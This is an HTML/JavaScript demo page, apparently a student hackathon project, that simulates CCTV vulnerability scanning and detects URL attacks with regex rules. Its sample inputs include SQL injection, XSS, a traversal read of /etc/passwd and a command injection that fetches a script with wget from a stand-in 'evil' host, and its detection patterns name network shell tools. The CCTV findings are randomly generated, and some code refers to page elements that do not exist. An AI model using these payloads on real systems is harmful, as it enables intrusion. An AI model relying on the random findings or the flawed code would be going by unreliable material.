<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>SIH Demo â€” CCTV VAPT & URL Attack Detection (Combined)</title>

<!-- Bootstrap for basic layout (CDN) -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

<style>
  :root{
    --bg:#071017; --panel:#0f1a23; --muted:#9aa7b0; --accent:#00d47a;
  }
  body{ background:linear-gradient(180deg,#041018 0%, #071017 100%); color:#e6eef2; font-family:Inter,Arial, sans-serif; }
  .app-header{ padding:18px; text-align:center; background:linear-gradient(90deg,#062126,#0b2730); border-bottom:1px solid rgba(255,255,255,0.03);}
  h1{ color:var(--accent); margin:0; font-size:1.4rem; letter-spacing:1px;}
  .container-main{ padding:18px; max-width:1100px; margin:18px auto; }
  .card-panel{ background:linear-gradient(180deg,var(--panel), #07151a); border:1px solid rgba(255,255,255,0.03); border-radius:8px; padding:14px; margin-bottom:14px;}
  .btn-accent{ background:var(--accent); color:#062224; border:0; }
  .small-muted{ color:var(--muted); font-size:0.9rem;}
  table thead th{ background:#071e26; color:var(--accent); }
  .badge-high{ background:#ff6b6b; color:#fff; }
  .badge-med{ background:#ffb86b; color:#111; }
  .badge-low{ background:#7ef0b5; color:#062224; }
  .hidden{ display:none; }
  .token{ display:inline-block; margin:3px; padding:3px 6px; border-radius:6px; background:#102a33; color:#bfeee0; font-size:0.85rem;}
  .token.warn{ background:#3a1f1f; color:#ffd6d6; font-weight:600; }
  .controls-row{ display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
  footer{ text-align:center; margin-top:18px; padding:10px; color:var(--muted); font-size:0.9rem;}
  .nav-choose .btn{ min-width:150px; }
  @media print {
    body{ background: #fff; color: #000; }
    .no-print{ display:none !important; }
  }
</style>
</head>
<body>
  <header class="app-header">
    <div class="container-main">
      <h1>SIH Demo â€” CCTV VAPT & URL Attack Detection</h1>
      <div class="small-muted">Choose a module below. This demo is offline & educational â€” no real scanning performed.</div>
    </div>
  </header>

  <main class="container-main">
    <!-- Landing / Choose -->
    <section id="choose" class="card-panel">
      <h3>Choose Module</h3>
      <p class="small-muted">Pick one demo to open. Both modules are interactive and include CSV/JSON import-export, charts, and saved history.</p>
      <div class="nav-choose mt-3">
        <button class="btn btn-accent me-2" onclick="showModule('cctv')">CCTV & DVR VAPT Demo</button>
        <button class="btn btn-accent" onclick="showModule('url')">URL Attack Detection Demo</button>
        <button class="btn btn-outline-light ms-3" onclick="openEthics()">ETHICS & Responsible Use</button>
      </div>
    </section>

    <!-- CCTV Module -->
    <section id="cctv" class="card-panel hidden">
      <div class="d-flex justify-content-between align-items-start mb-2">
        <h3>ðŸ“· CCTV & DVR VAPT (Simulated)</h3>
        <div class="small-muted">Module: 25233 â€” Simulated scans only.</div>
      </div>

      <div class="card-panel mb-3">
        <div class="controls-row">
          <input id="cctvInput" type="text" placeholder="Enter CCTV IP or URL (e.g., 192.168.1.50)" class="form-control" style="width:380px;">
          <select id="cctvScenario" class="form-select" style="width:220px;">
            <option value="">Choose scenario (optional)</option>
            <option>Default Credentials</option>
            <option>Open RTSP</option>
            <option>Outdated Firmware</option>
            <option>Weak TLS</option>
          </select>
          <button class="btn btn-accent" onclick="cctvRunScan()">Start Scan</button>
          <button class="btn btn-light" onclick="cctvPrefill()">Prefill Demo Data</button>
          <button class="btn btn-outline-light" onclick="showChoose()">Back</button>
        </div>
        <div class="small-muted mt-2">Tip: use sample IPs like <code>10.0.0.5</code> or paste an IP list via CSV import below.</div>
      </div>

      <!-- results table -->
      <div class="card-panel">
        <div class="d-flex justify-content-between align-items-center">
          <h5>Scan Results</h5>
          <div>
            <button class="btn btn-outline-light me-2" onclick="cctvExport('csv')">Export CSV</button>
            <button class="btn btn-outline-light me-2" onclick="cctvExport('json')">Export JSON</button>
            <input id="cctvCsvFile" type="file" accept=".csv" style="display:inline-block" onchange="cctvImport(this.files)">
            <button class="btn btn-light ms-2" onclick="cctvClear()">Clear</button>
            <button class="btn btn-outline-light ms-2" onclick="window.print()">Print Report</button>
          </div>
        </div>

        <div style="overflow:auto; margin-top:12px;">
          <table class="table table-sm table-dark" id="cctvTable">
            <thead>
              <tr><th>#</th><th>IP/URL</th><th>Vendor</th><th>Model</th><th>Firmware</th><th>Vulnerability</th><th>Risk</th></tr>
            </thead>
            <tbody></tbody>
          </table>
        </div>
      </div>

      <div class="row mt-3">
        <div class="col-md-6 card-panel">
          <h6>Risk Distribution</h6>
          <canvas id="cctvRiskChart"></canvas>
        </div>
        <div class="col-md-6 card-panel">
          <h6>Vulnerabilities by Vendor</h6>
          <canvas id="cctvVendorChart"></canvas>
        </div>
      </div>

      <div class="card-panel mt-3">
        <h6>Simulated Live Feed (Demo only)</h6>
        <div class="small-muted mb-2">This is a sample looping video to simulate a CCTV feed â€” DO NOT use real camera feeds without permission.</div>
        <video controls autoplay muted loop style="max-width:100%; border-radius:6px; border:2px solid #083a2c;">
          <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
          Your browser does not support video tag.
        </video>
      </div>
    </section>

    <!-- URL Module -->
    <section id="url" class="card-panel hidden">
      <div class="d-flex justify-content-between align-items-start mb-2">
        <h3>ðŸ”— URL Attack Detection (Simulated)</h3>
        <div class="small-muted">Module: 25229 â€” detects common URL patterns (simulated).</div>
      </div>

      <div class="card-panel mb-3">
        <div class="controls-row">
          <input id="urlInput" type="text" placeholder="Enter URL or path (e.g., /index.php?id=1 OR 1=1)" class="form-control" style="width:420px;">
          <select id="urlScenario" class="form-select" style="width:240px;">
            <option value="">Scenario (optional)</option>
            <option>SQLi</option>
            <option>XSS</option>
            <option>Directory Traversal</option>
            <option>SSRF</option>
          </select>
          <button class="btn btn-accent" onclick="urlRunScan()">Scan URL</button>
          <button class="btn btn-light" onclick="urlPrefill()">Prefill Samples</button>
          <button class="btn btn-outline-light" onclick="showChoose()">Back</button>
        </div>
        <div class="small-muted mt-2">Tip: paste multiple URLs via CSV (one per line) to batch import.</div>
      </div>

      <div class="card-panel">
        <div class="d-flex justify-content-between align-items-center">
          <h5>Detected URL Attacks</h5>
          <div>
            <button class="btn btn-outline-light me-2" onclick="urlExport('csv')">Export CSV</button>
            <button class="btn btn-outline-light me-2" onclick="urlExport('json')">Export JSON</button>
            <input id="urlCsvFile" type="file" accept=".csv" onchange="urlImport(this.files)" style="display:inline-block">
            <button class="btn btn-light ms-2" onclick="urlClear()">Clear</button>
            <button class="btn btn-outline-light ms-2" onclick="window.print()">Print</button>
          </div>
        </div>

        <div style="overflow:auto; margin-top:12px;">
          <table class="table table-sm table-dark" id="urlTable">
            <thead>
              <tr><th>#</th><th>URL</th><th>Findings</th><th>Tokens</th><th>Severity</th></tr>
            </thead>
            <tbody></tbody>
          </table>
        </div>
      </div>

      <div class="row mt-3">
        <div class="col-md-6 card-panel">
          <h6>Severity Distribution</h6>
          <canvas id="urlSeverityChart"></canvas>
        </div>
        <div class="col-md-6 card-panel">
          <h6>Top Attack Types</h6>
          <canvas id="urlAttackChart"></canvas>
        </div>
      </div>

      <div class="card-panel mt-3">
        <h6>Explainability & Recommendation</h6>
        <div id="urlExplain" class="small-muted">When a URL is scanned, matched tokens will be highlighted and a short recommendation shown here.</div>
      </div>
    </section>

    <!-- Ethics modal (simple) -->
    <div id="ethicsModal" class="card-panel hidden">
      <h4>Ethics & Responsible Use</h4>
      <p class="small-muted">
        This project is for educational/demonstration purposes only. Do not scan or attempt to exploit devices or services that you do not own or do not have explicit permission to test.
        If you find a real vulnerability, follow responsible disclosure practices.
      </p>
      <button class="btn btn-light" onclick="closeEthics()">Close</button>
    </div>
  </main>

  <footer>
    <div class="small-muted">Prepared for SIH â€” Problem IDs: 25233 (CCTV) & 25229 (URL). Team: Devendra & Team â€¢ Â© 2025</div>
  </footer>

<script>
/* =============================
   Shared helper utilities
   ============================= */
function showModule(name){
  document.getElementById('choose').classList.add('hidden');
  document.getElementById('ethicsModal').classList.add('hidden');
  ['cctv','url'].forEach(id => {
    document.getElementById(id).classList.toggle('hidden', id !== name);
  });
}

function showChoose(){
  document.getElementById('choose').classList.remove('hidden');
  ['cctv','url','ethicsModal'].forEach(id => document.getElementById(id).classList.add('hidden'));
}

function openEthics(){
  document.getElementById('choose').classList.add('hidden');
  document.getElementById('ethicsModal').classList.remove('hidden');
}

/* =============================
   CCTV module
   ============================= */
const CCTV_VENDORS = ["Hikvision","Dahua","CP Plus","Axis","Sony","Bosch","Uniview"];
const CCTV_MODELS = ["DS-2CD2142","NVR-3216","CP-UNC-VMS","P3225-LV","SNCRZ25","BOS-5000","UNV-2123"];
const CCTV_FIRMWARE = ["v2.1.4","v3.0.1","v1.9.7","v4.2.0","v5.0.2","v6.0.0"];
const CCTV_VULNS = [
  {name:"Default Credentials", risk:"High", rec:"Change default passwords immediately."},
  {name:"Outdated Firmware (CVE matched)", risk:"High", rec:"Update firmware to latest vendor release."},
  {name:"Open RTSP Port", risk:"Medium", rec:"Restrict access using firewall rules."},
  {name:"Weak TLS/SSL", risk:"Medium", rec:"Disable weak ciphers and use TLS 1.2/1.3."},
  {name:"Exposed Admin Interface", risk:"High", rec:"Restrict admin interface to management network."}
];

let cctvHistory = JSON.parse(localStorage.getItem('cctvHistory_v1')||'[]');
renderCCTV();

function cctvSave(){
  localStorage.setItem('cctvHistory_v1', JSON.stringify(cctvHistory));
}

function cctvRunScan(){
  const target = document.getElementById('cctvInput').value.trim();
  if(!target){ alert('Enter IP or URL'); return; }
  document.getElementById('loading').style.display = 'block';
  setTimeout(()=> {
    document.getElementById('loading').style.display = 'none';
    // simulate result
    const vendor = sample(CCTV_VENDORS);
    const model = sample(CCTV_MODELS);
    const firmware = sample(CCTV_FIRMWARE);
    const vuln = sample(CCTV_VULNS);
    const row = { ip: target, vendor, model, firmware, vuln: vuln.name, risk: vuln.risk, rec: vuln.rec, ts: new Date().toISOString() };
    cctvHistory.unshift(row);
    if(cctvHistory.length>200) cctvHistory.pop();
    cctvSave();
    renderCCTV();
  }, 1200);
}

function cctvPrefill(){
  const samples = ["10.0.0.5","10.0.0.7","192.168.1.100"];
  samples.forEach(ip=> {
    const vendor = sample(CCTV_VENDORS);
    const model = sample(CCTV_MODELS);
    const firmware = sample(CCTV_FIRMWARE);
    const vuln = sample(CCTV_VULNS);
    cctvHistory.unshift({ip,vendor,model,firmware,vuln:vuln.name,risk:vuln.risk,rec:vuln.rec,ts:new Date().toISOString()});
  });
  cctvSave(); renderCCTV();
}

function renderCCTV(){
  const tbody = document.querySelector('#cctvTable tbody');
  tbody.innerHTML = '';
  cctvHistory.forEach((r,i)=>{
    const tr = document.createElement('tr');
    const riskCls = r.risk.toLowerCase()==='high'?'badge-high': r.risk.toLowerCase()==='medium'?'badge-med':'badge-low';
    tr.innerHTML = `<td>${i+1}</td>
      <td>${escapeHtml(r.ip)}</td>
      <td>${escapeHtml(r.vendor)}</td>
      <td>${escapeHtml(r.model)}</td>
      <td>${escapeHtml(r.firmware)}</td>
      <td>${escapeHtml(r.vuln)}</td>
      <td><span class="${riskCls}">${escapeHtml(r.risk)}</span></td>`;
    tbody.appendChild(tr);
  });
  updateCCTVCharts();
  // toggle result visibility
  document.getElementById('resultsTable').style.display = cctvHistory.length ? 'table' : 'none';
  document.getElementById('exportCSV').style.display = cctvHistory.length ? 'inline-block' : 'none';
  document.getElementById('exportJSON').style.display = cctvHistory.length ? 'inline-block' : 'none';
}

function updateCCTVCharts(){
  const riskCounts = {High:0, Medium:0, Low:0};
  const vendorCounts = {};
  cctvHistory.forEach(r => {
    riskCounts[r.risk] = (riskCounts[r.risk]||0)+1;
    vendorCounts[r.vendor] = (vendorCounts[r.vendor]||0)+1;
  });
  // draw charts (destroy if exist)
  drawPie('cctvRiskChart', ['High','Medium','Low'], [riskCounts.High||0,riskCounts.Medium||0,riskCounts.Low||0]);
  drawBar('cctvVendorChart', Object.keys(vendorCounts), Object.values(vendorCounts));
}

function cctvExport(type){
  if(!cctvHistory.length){ alert('No data'); return; }
  if(type==='csv'){
    let csv = 'IP,Vendor,Model,Firmware,Vulnerability,Risk,Rec,Timestamp\n';
    cctvHistory.forEach(r => csv += `"${r.ip}","${r.vendor}","${r.model}","${r.firmware}","${r.vuln}","${r.risk}","${r.rec || ''}","${r.ts}"\n`);
    downloadFile('cctv_scan.csv', csv);
  } else {
    downloadFile('cctv_scan.json', JSON.stringify(cctvHistory,null,2));
  }
}
function cctvImport(files){
  if(!files || !files[0]) return;
  const reader = new FileReader();
  reader.onload = e => {
    const lines = e.target.result.split(/\r?\n/).filter(Boolean);
    // naive parse; support one IP per line
    lines.forEach(line => {
      const ip = line.trim().split(',')[0].replace(/(^"|"$)/g,'');
      if(ip) {
        const vendor = sample(CCTV_VENDORS); const model = sample(CCTV_MODELS);
        const firmware = sample(CCTV_FIRMWARE); const vuln = sample(CCTV_VULNS);
        cctvHistory.unshift({ip,vendor,model,firmware,vuln:vuln.name,risk:vuln.risk,rec:vuln.rec,ts:new Date().toISOString()});
      }
    });
    cctvSave(); renderCCTV();
  };
  reader.readAsText(files[0]);
}
function cctvClear(){ if(confirm('Clear CCTV history?')){ cctvHistory=[]; cctvSave(); renderCCTV(); } }

/* =============================
   URL module
   ============================= */
const URL_RULES = [
  {name:'SQL Injection', regex:/(\bunion\b|\bselect\b|\binsert\b|\bdrop\b|\bupdate\b|\bdelete\b|\bor\s+1=1|--|;)/i, severity:'High', rec:'Sanitize inputs, use prepared statements.'},
  {name:'Cross Site Scripting (XSS)', regex:/(<script\b|%3Cscript|onerror=|onload=|javascript:)/i, severity:'Medium', rec:'Escape output, use CSP.'},
  {name:'Directory Traversal', regex:/(\.\.\/|\.\.\\)/, severity:'High', rec:'Validate path inputs and use allowlists.'},
  {name:'Command Injection', regex:/(\b(wget|curl|nc|bash|sh)\b|;|\|\||\&\&)/i, severity:'High', rec:'Avoid shelling user input; use safe APIs.'},
  {name:'Web-shell / suspicious file', regex:/(cmd\.jsp|shell\.php|backdoor|webshell|\.asp$|\.jsp$|\.php$)/i, severity:'High', rec:'Restrict file uploads and scan for shells.'},
  {name:'SSRF', regex:/(http:\/\/127\.0\.0\.1|http:\/\/localhost|file:\/\/)/i, severity:'Medium', rec:'Validate and restrict outgoing URLs.'},
  {name:'HTTP Param Pollution', regex:/(\&.*\=.+\&.*\=)/, severity:'Low', rec:'Normalize parameters and validate inputs.'},
  {name:'XXE', regex:/(<\!ENTITY|SYSTEM\s+"file:)/i, severity:'High', rec:'Disable DTDs and use safe XML parsers.'},
  {name:'Typosquatting', regex:/(xn--|paypal-security|gooogle|facebok|micorsoft)/i, severity:'Medium', rec:'Use domain filtering and educate users.'}
];

let urlHistory = JSON.parse(localStorage.getItem('urlHistory_v1')||'[]');
renderURL();

function urlSave(){ localStorage.setItem('urlHistory_v1', JSON.stringify(urlHistory)); }

function urlRunScan(){
  const raw = document.getElementById('urlInput').value.trim();
  if(!raw){ alert('Enter URL/path'); return; }
  document.getElementById('loading').style.display = 'block';
  setTimeout(()=> {
    document.getElementById('loading').style.display = 'none';
    // perform rule checks
    const res = analyzeURL(raw);
    urlHistory.unshift(Object.assign({url:raw, ts:new Date().toISOString()}, res));
    if(urlHistory.length>500) urlHistory.pop();
    urlSave(); renderURL();
  }, 700);
}

function analyzeURL(u){
  const findings = [];
  const tokens = tokenize(u);
  URL_RULES.forEach(rule => {
    if(rule.regex.test(u)){
      findings.push({name:rule.name, severity:rule.severity, rec:rule.rec, match: getMatches(u,rule.regex)});
    }
  });
  const severity = findings.some(f=>f.severity==='High') ? 'High' : (findings.length? 'Medium' : 'Low');
  return { findings, tokens, severity };
}

function tokenize(u){
  try {
    const s = decodeURIComponent(u);
    return s.split(/[\W_\/\?\=\&]+/).filter(Boolean).slice(0,30);
  } catch(e){ return u.split(/[\W_\/\?\=\&]+/).filter(Boolean); }
}

function getMatches(text, regex){
  const m = text.match(regex);
  return m? m.slice(0,3) : [];
}

function urlPrefill(){
  const samples = [
    "/index.php?id=1 OR 1=1",
    "/search?q=<script>alert(1)</script>",
    "/view.php?file=../../etc/passwd",
    "/product?id=5; wget http://evil/x.sh",
    "/wp-content/plugins/cmd.jsp"
  ];
  samples.forEach(s => {
    const res = analyzeURL(s);
    urlHistory.unshift(Object.assign({url:s, ts:new Date().toISOString()}, res));
  });
  urlSave(); renderURL();
}

function renderURL(){
  const tbody = document.querySelector('#urlTable tbody');
  tbody.innerHTML = '';
  urlHistory.forEach((r,i)=>{
    const tr = document.createElement('tr');
    const sevBadge = r.severity==='High'? 'badge-high': r.severity==='Medium'? 'badge-med':'badge-low';
    const findingsText = r.findings.length ? r.findings.map(f=>f.name).join(', ') : 'No detections';
    const tokensHtml = (r.tokens||[]).slice(0,8).map(t=>`<span class="token ${isSuspicious(t)?'warn':''}">${escapeHtml(t)}</span>`).join(' ');
    tr.innerHTML = `<td>${i+1}</td><td>${escapeHtml(r.url)}</td><td>${findingsText}</td><td>${tokensHtml}</td><td><span class="${sevBadge}">${r.severity}</span></td>`;
    tbody.appendChild(tr);
    // explanation area attach click
    tr.onclick = ()=> showUrlExplain(r);
  });
  updateURLCharts();
}

function showUrlExplain(r){
  const el = document.getElementById('urlExplain');
  if(!r.findings.length){ el.innerHTML = '<i class="small-muted">No issues detected</i>'; return; }
  let html = '<ul>';
  r.findings.forEach(f => {
    html += `<li><strong>${escapeHtml(f.name)}</strong> â€” matched tokens: ${escapeHtml(f.match.join(', ')||'--')}. Recommendation: ${escapeHtml(f.rec)}</li>`;
  });
  html += '</ul>';
  el.innerHTML = html;
}

function updateURLCharts(){
  const severityCounts = {High:0, Medium:0, Low:0};
  const attackCounts = {};
  urlHistory.forEach(r=>{
    severityCounts[r.severity] = (severityCounts[r.severity]||0)+1;
    r.findings.forEach(f=> attackCounts[f.name] = (attackCounts[f.name]||0)+1);
  });
  drawPie('urlSeverityChart', ['High','Medium','Low'], [severityCounts.High||0,severityCounts.Medium||0,severityCounts.Low||0]);
  drawBar('urlAttackChart', Object.keys(attackCounts), Object.values(attackCounts));
}

function urlExport(type){
  if(!urlHistory.length){ alert('No data'); return; }
  if(type==='csv'){
    let csv = 'URL,Findings,Tokens,Severity,Timestamp\n';
    urlHistory.forEach(r => {
      const f = (r.findings||[]).map(x=>x.name).join(';');
      const t = (r.tokens||[]).join(' ');
      csv += `"${r.url.replace(/"/g,'""')}","${f.replace(/"/g,'""')}","${t.replace(/"/g,'""')}","${r.severity}","${r.ts}"\n`;
    });
    downloadFile('url_results.csv', csv);
  } else {
    downloadFile('url_results.json', JSON.stringify(urlHistory,null,2));
  }
}
function urlImport(files){
  if(!files || !files[0]) return;
  const reader = new FileReader();
  reader.onload = e => {
    const lines = e.target.result.split(/\r?\n/).filter(Boolean);
    lines.forEach(line => {
      const url = line.split(',')[0].replace(/(^"|"$)/g,'').trim();
      if(url){
        const res = analyzeURL(url);
        urlHistory.unshift(Object.assign({url, ts:new Date().toISOString()}, res));
      }
    });
    urlSave(); renderURL();
  };
  reader.readAsText(files[0]);
}
function urlClear(){ if(confirm('Clear URL history?')){ urlHistory=[]; urlSave(); renderURL(); } }

/* =============================
   Generic helpers & charts
   ============================= */
function sample(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
function escapeHtml(str){ return (str+"").replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function downloadFile(name, content){ const blob = new Blob([content],{type:'text/plain'}); const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = name; a.click(); }
function isSuspicious(token){ return /script|cmd|backdoor|passwd|wget|union|select|<|>|\.\./i.test(token); }
function getMatches(text, regex){ const m = text.match(regex); return m? (Array.isArray(m)?m: [m]): []; }

/* Chart wrappers: destroys previous with same id */
const chartStore = {};
function drawPie(elId, labels, data){
  if(chartStore[elId]) chartStore[elId].destroy();
  const ctx = document.getElementById(elId).getContext('2d');
  chartStore[elId] = new Chart(ctx, { type:'pie', data:{ labels, datasets:[{data, backgroundColor:['#ff6b6b','#ffb86b','#7ef0b5']}]}});
}
function drawBar(elId, labels, data){
  if(chartStore[elId]) chartStore[elId].destroy();
  const ctx = document.getElementById(elId).getContext('2d');
  chartStore[elId] = new Chart(ctx, { type:'bar', data:{ labels, datasets:[{label:'Count', data, backgroundColor:'#00d47a'}]}, options:{ indexAxis:'y', scales:{ x:{ beginAtZero:true }}}});
}

/* =============================
   Initialize: render any saved data
   ============================= */
renderCCTV(); renderURL();

/* =============================
   Small UX helpers
   ============================= */
function openEthics(){ openEthicsModal(); }
function openEthicsModal(){
  alert("ETHICS: This tool is educational. Only test with permission. Follow responsible disclosure.");
}

/* =============================
   End script
   ============================= */
</script>

</body>
</html>
